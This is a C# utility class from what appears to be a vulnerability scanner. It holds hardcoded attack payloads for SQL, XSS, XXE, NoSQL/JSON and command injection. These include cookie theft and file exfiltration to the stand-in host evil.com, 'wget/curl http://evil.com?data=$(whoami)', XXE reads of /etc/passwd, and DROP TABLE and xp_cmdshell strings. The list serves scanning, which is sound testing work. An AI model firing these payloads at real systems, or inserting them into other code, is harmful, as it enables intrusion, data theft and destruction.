using SentinelVulnScan.Models;

namespace SentinelVulnScan.Utils;

/// <summary>
/// Utility class for generating attack payloads for different vulnerability types
/// </summary>
public class PayloadGenerator
{
    /// <summary>
    /// Generate SQL injection payloads
    /// </summary>
    /// <returns>List of SQL injection payloads</returns>
    public static List<string> GenerateSqlInjectionPayloads()
    {
        return new List<string>
        {
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users; --",
            "1' OR '1' = '1",
            "1' AND 1=1--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT username,password,1 FROM users--",
            "admin' --",
            "admin' #",
            "' OR 1=1 #",
            "' OR 1=1 LIMIT 1--",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; EXEC xp_cmdshell('dir')--",
            "'; SELECT pg_sleep(5)--",
            "' OR SLEEP(5)#",
            "1; SELECT BENCHMARK(5000000,MD5('test'))--",
            "' OR 1=CONVERT(int,(SELECT @@VERSION))--",
            "' OR '1'='1' /*"
        };
    }
    
    /// <summary>
    /// Generate XSS payloads
    /// </summary>
    /// <returns>List of XSS payloads</returns>
    public static List<string> GenerateXssPayloads()
    {
        return new List<string>
        {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "\"><script>alert('XSS')</script>",
            "';alert('XSS');//",
            "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
            "<img src=1 href=1 onerror=\"javascript:alert('XSS')\"></img>",
            "<audio src=1 href=1 onerror=\"javascript:alert('XSS')\"></audio>",
            "<video src=1 href=1 onerror=\"javascript:alert('XSS')\"></video>",
            "<body src=1 href=1 onerror=\"javascript:alert('XSS')\"></body>",
            "<object src=1 href=1 onerror=\"javascript:alert('XSS')\"></object>",
            "<script>alert(document.domain)</script>"
        };
    }
    
    /// <summary>
    /// Generate XML injection payloads
    /// </summary>
    /// <returns>List of XML injection payloads</returns>
    public static List<string> GenerateXmlInjectionPayloads()
    {
        return new List<string>
        {
            "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY ac SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&ac;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]>",
            "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>\">%eval;%exfil;]>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]><foo></foo>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://evil.com/evil.dtd\">%remote;]>"
        };
    }
    
    /// <summary>
    /// Generate JSON injection payloads
    /// </summary>
    /// <returns>List of JSON injection payloads</returns>
    public static List<string> GenerateJsonInjectionPayloads()
    {
        return new List<string>
        {
            "\"}\", {\"malicious\": \"payload",
            "{\"__proto__\": {\"polluted\": true}}",
            "{\"constructor\": {\"prototype\": {\"polluted\": true}}}",
            "{\"user\": \"admin\", \"role\": \"administrator\"}",
            "{\"$where\": \"this.a == 1\"}",
            "{\"$gt\": \"\"}",
            "{\"\": {\"$ne\": null}}",
            "{\"$regex\": \"^a\"}",
            "{\"user\": {\"$exists\": true}}",
            "{\"user\": {\"$nin\": [\"user1\", \"user2\"]}}",
            "{\"\": {\"$where\": \"sleep(5000)\"}}",
            "{\"$ne\": 1}",
            // Payloads targeting NoSQL injection
            "{\"username\": {\"$regex\": \"admin\", \"$options\": \"i\"}}",
            "{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}",
            "{\"username\": {\"$in\": [\"admin\", \"root\", \"superuser\"]}}"
        };
    }
    
    /// <summary>
    /// Generate command injection payloads
    /// </summary>
    /// <returns>List of command injection payloads</returns>
    public static List<string> GenerateCommandInjectionPayloads()
    {
        return new List<string>
        {
            "; ls -la",
            "& dir",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; ping -c 5 evil.com",
            "& ping -n 5 evil.com",
            "| whoami",
            "; sleep 5",
            "& timeout 5",
            "; id",
            "| id",
            "& id",
            "; echo $PATH",
            "| echo $PATH",
            "; env",
            "& set",
            "| type C:\\Windows\\win.ini", // Windows specific
            "; uname -a",  // Unix specific
            "& systeminfo", // Windows specific
            // Time-based payloads
            "& ping -n 15 127.0.0.1",
            "; sleep 15",
            "`sleep 15`",
            "$(sleep 15)",
            // Blind command injection
            "& nslookup uniqueid.evil.com",
            "; wget http://evil.com?data=$(whoami)",
            "| curl http://evil.com?data=$(whoami)"
        };
    }
    
    /// <summary>
    /// Generate payloads for a specific vulnerability type
    /// </summary>
    /// <param name="vulnerabilityType">Type of vulnerability</param>
    /// <returns>List of payloads for the specified vulnerability type</returns>
    public static List<string> GeneratePayloads(string vulnerabilityType)
    {
        return vulnerabilityType switch
        {
            "SqlInjection" => GenerateSqlInjectionPayloads(),
            "XssInjection" => GenerateXssPayloads(),
            "XmlInjection" => GenerateXmlInjectionPayloads(),
            "JsonInjection" => GenerateJsonInjectionPayloads(),
            "CommandInjection" => GenerateCommandInjectionPayloads(),
            _ => new List<string>()
        };
    }
}
